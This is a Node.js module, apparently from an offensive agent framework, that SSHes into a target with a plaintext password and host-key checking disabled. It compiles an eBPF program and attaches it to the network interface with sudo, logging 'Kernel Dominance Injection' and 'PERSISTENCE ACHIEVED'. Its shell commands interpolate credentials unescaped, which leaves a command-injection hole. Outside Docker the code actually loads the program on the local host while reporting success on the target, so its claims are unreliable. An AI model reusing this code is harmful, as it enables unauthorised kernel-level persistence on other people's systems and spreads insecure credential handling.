const { exec } = require('child_process');
const util = require('util');
const path = require('path');
const execPromise = util.promisify(exec);
const { isAllowedTarget } = require('../security/securityGovernor');
const injectKernelDominance = async (targetIp, sshCredentials, compassContext = null) => {
    console.log(`\n[💉] PHASE 9.5: Initiating Kernel Dominance Injection on ${targetIp}...`);
    if (compassContext) {
        console.log(`[🧭] COMPASS ACQUIRED: Agent environment mapped.`);
        console.log(`    Local: ${compassContext.currentEnvironment}`);
        console.log(`    Target: ${compassContext.targetEnvironment}`);
    }
    if (!isAllowedTarget(targetIp)) {
        console.log(`[🛑] INJECTION ABORTED: Governor Lockout.`);
        return { success: false, reason: 'Governor Lockout' };
    }
    try {
        console.log(`[🔍] Probing target environment...`);
        let kernelVersion = '';
        try {
            if (compassContext && compassContext.targetEnvironment === 'docker') {
                const { stdout } = await execPromise(`docker exec ${compassContext.targetContainer} uname -r`, { timeout: 10000 });
                kernelVersion = stdout.trim();
            } else {
                const { stdout } = await execPromise(`sshpass -p ${sshCredentials.password} ssh -o StrictHostKeyChecking=no ${sshCredentials.user}@${targetIp} "uname -r"`, { timeout: 10000 });
                kernelVersion = stdout.trim();
            }
        } catch (e) {
            console.log(`[⚠️] Probe failed: ${e.message}. Attempting fallback...`);
            if (compassContext && compassContext.targetEnvironment === 'docker') {
               const { stdout } = await execPromise(`docker exec ${compassContext.targetContainer} sh -c "uname -r"`);
               kernelVersion = stdout.trim();
            } else {
               const { stdout } = await execPromise(`uname -r`);
               kernelVersion = stdout.trim();
            }
        }
        console.log(`[🎯] Target Kernel Version: ${kernelVersion}`);
        const ebpfPath = path.join(__dirname, 'ebpf_module', 'ebpf_neural_net.c');
        const objPath = path.join(__dirname, 'ebpf_module', `ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o`);
        console.log(`[🔨] Compiling NEE specifically for Kernel ${kernelVersion}...`);
        let compileCmd = '';
        const isWindowsHost = process.platform === 'win32';
        if (compassContext && compassContext.targetEnvironment === 'docker') {
             if (isWindowsHost) {
                 compileCmd = `docker exec ${compassContext.targetContainer} clang -O2 -target bpf -D_KERNEL_VERSION="${kernelVersion}" -c "/ebpf_module/ebpf_neural_net.c" -o "/ebpf_module/ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o"`;
             } else {
                 compileCmd = `docker exec ${compassContext.targetContainer} clang -O2 -target bpf -D_KERNEL_VERSION="${kernelVersion}" -c "/ebpf_module/ebpf_neural_net.c" -o "/ebpf_module/ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o"`;
             }
        } else {
             compileCmd = `clang -O2 -target bpf -D_KERNEL_VERSION="${kernelVersion}" -c "${ebpfPath}" -o "${objPath}"`;
        }
        await execPromise(compileCmd);
        console.log(`[✅] NEE Compiled Successfully.`);
        console.log(`[🚀] Deploying payload to ring-0...`);
        const defaultInterface = "eth0"; 
        if (compassContext && compassContext.targetEnvironment === 'docker') {
            await execPromise(`docker exec ${compassContext.targetContainer} ip link set dev ${defaultInterface} xdpgeneric off`).catch(() => {});
            await execPromise(`docker exec ${compassContext.targetContainer} ip link set dev ${defaultInterface} xdpgeneric obj "/ebpf_module/ebpf_neural_net_${targetIp.replace(/\./g, '_')}.o" sec xdp_drop`);
        } else {
            await execPromise(`sudo ip link set dev ${defaultInterface} xdpgeneric off`).catch(() => {});
            await execPromise(`sudo ip link set dev ${defaultInterface} xdpgeneric obj "${objPath}" sec xdp_drop`);
        }
        console.log(`[👑] PERSISTENCE ACHIEVED: eBPF Neural Engine injected into ${targetIp}.`);
        return { success: true, kernel: kernelVersion, interface: defaultInterface };
    } catch (error) {
        console.error(`[❌] Kernel Dominance Failed:`, error.message);
        return { success: false, reason: error.message };
    }
};
module.exports = { injectKernelDominance };
